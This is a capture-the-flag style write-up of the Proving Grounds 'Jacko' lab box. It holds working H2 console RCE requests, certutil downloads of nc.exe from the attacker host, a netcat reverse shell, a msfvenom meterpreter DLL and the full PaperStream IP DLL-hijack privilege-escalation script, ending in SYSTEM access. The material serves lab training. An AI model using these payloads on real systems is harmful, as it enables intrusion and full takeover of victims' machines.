### Jacko Proving Grounds

### Difficulty: Intermediate

### IP Address = 192.168.88.66

Nmap Scan: 

```
┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/Jacko]
└─$ nmap -sCV -A 192.168.88.66 -p80,135,139,445,8082 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-20 21:59 WAT
Nmap scan report for 192.168.88.66
Host is up (0.45s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: H2 Database Engine (redirect)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.48 seconds

```

Checking the web server on port 80
![image](https://user-images.githubusercontent.com/113513376/213804329-e6862f0f-3506-4e6c-99c1-870bbd95ad59.png)

Searching for what H2 Database Engine means
![image](https://user-images.githubusercontent.com/113513376/213804600-3fe045fe-c9ee-4ab9-8638-11a0cc3e5316.png)

On reading about it shows the db web interface runs on port 8082

And this target does have a web server running on port 8082 

Checking it out shows a login page
![image](https://user-images.githubusercontent.com/113513376/213804829-a2a5b348-185d-4dff-9e30-c8c9e6967971.png)

By default we can login without any credential 

Trying it out works 
![image](https://user-images.githubusercontent.com/113513376/213805023-a506bcbf-a766-430a-b087-b14a19c2e47b.png)

Now we need to get a shell via this 

So checking google on how to exploit this leads to this https://www.exploit-db.com/exploits/49384
![image](https://user-images.githubusercontent.com/113513376/213807777-21cdb0e1-4ee6-41fc-9415-deb8c087f0a0.png)

On following the instructions and running the command i got can now execute command on the target
![image](https://user-images.githubusercontent.com/113513376/213807858-ddceec40-bfec-4a63-af56-30deee32d002.png)

Now lets get a reverse shell

But first checking if the server can reach us 
![image](https://user-images.githubusercontent.com/113513376/213809523-d4035d8c-1011-47e0-945c-9600bd6d1150.png)

And back at tcpdump 

```
┌──(mark㉿haxor)-[/usr/share/windows-resources/binaries]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
22:32:48.622701 IP 192.168.88.66 > haxor: ICMP echo request, id 1, seq 1, length 40
22:32:48.625180 IP haxor > 192.168.88.66: ICMP echo reply, id 1, seq 1, length 40
22:32:49.633434 IP 192.168.88.66 > haxor: ICMP echo request, id 1, seq 2, length 40
22:32:49.638609 IP haxor > 192.168.88.66: ICMP echo reply, id 1, seq 2, length 40
22:32:50.648747 IP 192.168.88.66 > haxor: ICMP echo request, id 1, seq 3, length 40
22:32:50.648764 IP haxor > 192.168.88.66: ICMP echo reply, id 1, seq 3, length 40
22:32:51.662073 IP 192.168.88.66 > haxor: ICMP echo request, id 1, seq 4, length 40
22:32:51.662096 IP haxor > 192.168.88.66: ICMP echo reply, id 1, seq 4, length 40
```

Now lets try getting a reverse shell

Using things like wget,curl won't work 

I think its cause the current shell isn't powershell.exe

But anyways i used certutil.exe 

I set up a python web server which has nc.exe in its cwd 

And made the request to download the file using certutil.exe

Here's the http request 

```
POST /query.do?jsessionid=9ddd0a411e62d020d9eb60d02fbffeae HTTP/1.1
Host: 192.168.88.66:8082
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 223
Origin: http://192.168.88.66:8082
Connection: close
Referer: http://192.168.88.66:8082/query.jsp?jsessionid=9ddd0a411e62d020d9eb60d02fbffeae
Upgrade-Insecure-Requests: 1

sql=CALL+JNIScriptEngine_eval%28%27new+java.util.Scanner%28java.lang.Runtime.getRuntime%28%29.exec%28%22certutil.exe+-urlcache+-f+http%3a//192.168.49.88/nc.exe+nc.exe"%29.getInputStream%28%29%29.useDelimiter%28%22%5C%5CZ%22%29.next%28%29%27%29%3B
```

So after that i get callback from the python web server

```
                                                                                               
┌──(mark㉿haxor)-[/usr/share/windows-resources/binaries]
└─$ pyws -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.88.66 - - [20/Jan/2023 22:47:32] "GET /nc.exe HTTP/1.1" 200 -
192.168.88.66 - - [20/Jan/2023 22:47:33] "GET /nc.exe HTTP/1.1" 200 -

```

Now lets get shell

I set a netcat listner on port 8082 and then made a request to call nc.exe to connect back to use and give us shell

But it didn't work why

Cause the user doesn't have write access over that directory

So i made another download request but this time to place the file in the `C:\windows\temp\` directory

And tried connecting to my machine 

Here's the request

```
POST /query.do?jsessionid=fccede8694ff99b9069cd5519cb99b4d HTTP/1.1
Host: 192.168.88.66:8082
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 272
Origin: http://192.168.88.66:8082
Connection: close
Referer: http://192.168.88.66:8082/query.jsp?jsessionid=fccede8694ff99b9069cd5519cb99b4d
Upgrade-Insecure-Requests: 1

sql=CALL+JNIScriptEngine_eval%28%27new+java.util.Scanner%28java.lang.Runtime.getRuntime%28%29.exec%28%22certutil.exe+-urlcache+-f+http%3a//192.168.49.88/nc.exe+C%3a\\windows\\temp\\shell.exe%22%29.getInputStream%28%29%29.useDelimiter%28%22%5C%5CZ%22%29.next%28%29%27%29%3B
```

Now calling the binary to give us shell

```
POST /query.do?jsessionid=fccede8694ff99b9069cd5519cb99b4d HTTP/1.1
Host: 192.168.88.66:8082
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 272
Origin: http://192.168.88.66:8082
Connection: close
Referer: http://192.168.88.66:8082/query.jsp?jsessionid=fccede8694ff99b9069cd5519cb99b4d
Upgrade-Insecure-Requests: 1

sql=CALL+JNIScriptEngine_eval%28%27new+java.util.Scanner%28java.lang.Runtime.getRuntime%28%29.exec%28%22C%3a\\windows\\temp\\shell.exe+192.168.49.88+8082+-e+cmd.exe%22%29.getInputStream%28%29%29.useDelimiter%28%22%5C%5CZ%22%29.next%28%29%27%29%3B
```

And on the netcat listener

```
                                                                                                        
┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/Jacko]
└─$ nc -lvnp 8082
listening on [any] 8082 ...
connect to [192.168.49.88] from (UNKNOWN) [192.168.88.66] 49751
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\H2\service>

```

Now lets escalate our privilege to admin

But before that our shell is behaving funky cause the path isn't correct

We can easily fix that by doing `set PATH=%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\system32\windowspowershell\v1.0\;`

Now on checking the application installed directory `C:\program files (x86)`

We see a weird application

```
c:\>cd "Program Files (x86)"
cd "Program Files (x86)"

c:\Program Files (x86)>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC2F-6399

 Directory of c:\Program Files (x86)

04/27/2020  08:01 PM    <DIR>          .
04/27/2020  08:01 PM    <DIR>          ..
04/27/2020  07:59 PM    <DIR>          Common Files
04/27/2020  08:01 PM    <DIR>          fiScanner
04/27/2020  07:59 PM    <DIR>          H2
04/24/2020  08:50 AM    <DIR>          Internet Explorer
03/18/2019  08:52 PM    <DIR>          Microsoft.NET
04/27/2020  08:01 PM    <DIR>          PaperStream IP
03/18/2019  10:20 PM    <DIR>          Windows Defender
03/18/2019  08:52 PM    <DIR>          Windows Mail
04/24/2020  08:50 AM    <DIR>          Windows Media Player
03/18/2019  10:23 PM    <DIR>          Windows Multimedia Platform
03/18/2019  09:02 PM    <DIR>          Windows NT
03/18/2019  10:23 PM    <DIR>          Windows Photo Viewer
03/18/2019  10:23 PM    <DIR>          Windows Portable Devices
03/18/2019  08:52 PM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              16 Dir(s)   6,915,297,280 bytes free

c:\Program Files (x86)>
```

Searching for exploit on `PaperStream IP`

```
┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/Jacko]
└─$ searchsploit paperstream               
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation       | windows/local/49382.ps1
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Seems worth it lool

I'll get the file and transfer it to the target

```
                                                                                                       
┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/Jacko]
└─$ searchsploit -m windows/local/49382.ps1
  Exploit: PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/49382
     Path: /usr/share/exploitdb/exploits/windows/local/49382.ps1
File Type: ASCII text

Copied to: /home/mark/Desktop/B2B/Pg/Practice/Jacko/49382.ps1


                                                                                                        
┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/Jacko]
└─$ mv 49382.ps1 exploit.ps1
                                                                                                        
┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/Jacko]
└─$ pyws -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Reading the exploit code shows we need to create a malicious .dll file 
![image](https://user-images.githubusercontent.com/113513376/213819531-dae9ab1e-113b-46a9-8d85-2706e9e3a19c.png)

```
msf6 > msfvenom -p windows/meterpreter/reverse_tcp -f dll -o shell.dll LHOST=tun0 LPORT=80
[*] exec: msfvenom -p windows/meterpreter/reverse_tcp -f dll -o shell.dll LHOST=tun0 LPORT=80

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of dll file: 8704 bytes
Saved as: shell.dll
msf6 > 

```

Now i'll upload the exploit.ps1 & shell.dll to the target 

```
c:\Users\tony\Desktop>certutil.exe -urlcache -f http://192.168.49.88/exploit.ps1 exploit.ps1
certutil.exe -urlcache -f http://192.168.49.88/exploit.ps1 exploit.ps1
****  Online  ****
CertUtil: -URLCache command completed successfully.
c:\Users\tony\Desktop>certutil.exe -urlcache -f http://192.168.49.88/shell.dll shell.dll    
certutil.exe -urlcache -f http://192.168.49.88/shell.dll shell.dll
****  Online  ****
CertUtil: -URLCache command completed successfully.
c:\Users\tony\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC2F-6399

 Directory of c:\Users\tony\Desktop

01/20/2023  02:56 PM    <DIR>          .
01/20/2023  02:56 PM    <DIR>          ..
01/20/2023  02:47 PM             2,375 exploit.ps1
01/20/2023  02:22 PM                34 local.txt
04/22/2020  03:23 AM             1,450 Microsoft Edge.lnk
01/20/2023  02:56 PM             8,704 shell.dll
               4 File(s)         12,563 bytes
               2 Dir(s)   6,910,574,592 bytes free

c:\Users\tony\Desktop>
```

Here'e how the exploit.ps1 file should look like

```
# Exploit Title: PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation
# Exploit Author: 1F98D
# Original Author: securifera
# Date: 12 May 2020
# Vendor Hompage: https://www.fujitsu.com/global/support/products/computing/peripheral/scanners/fi/software/fi6x30-fi6x40-ps-ip-twain32.html
# CVE: CVE-2018-16156
# Tested on: Windows 10 x64
# References:
# https://www.securifera.com/advisories/cve-2018-16156/
# https://github.com/securifera/CVE-2018-16156-Exploit

# A DLL hijack vulnerability exists in the FJTWSVIC service running as part of
# the Fujitsu PaperStream IP (TWAIN) software package. This exploit searches
# for a writable location, copies the specified DLL to that location and then
# triggers the DLL load by sending a message to FJTWSVIC over the FjtwMkic_Fjicube_32
# named pipe.

$ErrorActionPreference = "Stop"

# Example payload generated as follows
# msfvenom -p windows/x64/shell_reverse_tcp -f dll -o shell.dll LHOST=eth0 LPORT=4444
$PayloadFile = "C:\users\tony\desktop\shell.dll"

if ((Test-Path $PayloadFile) -eq $false) {
    Write-Host "$PayloadFile not found, did you forget to upload it?"
    Exit 1
}

# Find Writable Location
$WritableDirectory = $null
$Path = (Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment" -Name "PATH").path
$Path -Split ";" | % {
    try {
        [IO.File]::OpenWrite("$_\x.txt").close()
        Remove-Item "$_\x.txt"
        $WritableDirectory = $_
    } catch {}
}

if ($WritableDirectory -eq $null) {
    Write-Host "No writable directories in PATH, FJTWSVIC is not exploitable"
    Exit 1
}

Write-Host "Writable location found, copying payload to $WritableDirectory"
Copy-Item "$PayloadFile" "$WritableDirectory\UninOldIS.dll"

Write-Host "Payload copied, triggering..."
$client = New-Object System.IO.Pipes.NamedPipeClientStream(".", "FjtwMkic_Fjicube_32", [System.IO.Pipes.PipeDirection]::InOut, [System.IO.Pipes.PipeOptions]::None, [System.Security.Principal.TokenImpersonationLevel]::Impersonation)
$reader = $null
$writer = $null
try {
    $client.Connect()
    $reader = New-Object System.IO.StreamReader($client)
    $writer = New-Object System.IO.StreamWriter($client)
    $writer.AutoFlush = $true
    $writer.Write("ChangeUninstallString")
    $reader.ReadLine()
} finally {
    $client.Dispose()
}

Write-Host "Payload triggered"
```

Now on our msf we start a listener

```
msf6 exploit(multi/handler) > use multi/handler
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.88:80 

```

Back on the target lets run the script 

But before that lets open powershell so that we can set execution policy true using `Set-ExecutionPolicy -ExecutionPolicy ByPass -Scope CurrentUser `

```
C:\Users\tony\Desktop>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\tony\Desktop> Set-ExecutionPolicy -ExecutionPolicy ByPass -Scope CurrentUser 
Set-ExecutionPolicy -ExecutionPolicy ByPass -Scope CurrentUser 
PS C:\Users\tony\Desktop> 
```

Now lets run the exploit code 

```
PS C:\Users\tony\Desktop> .\exploit.ps1
.\exploit.ps1
Writable location found, copying payload to C:\JavaTemp\
Payload copied, triggering...

```

Back on the listener 

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.88:80 
[*] Sending stage (175686 bytes) to 192.168.88.66
[*] Meterpreter session 1 opened (192.168.49.88:80 -> 192.168.88.66:49862) at 2023-01-21 00:20:23 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

And we're done xD

<br> <br>
[Back To Home](../../index.md)
<br>






















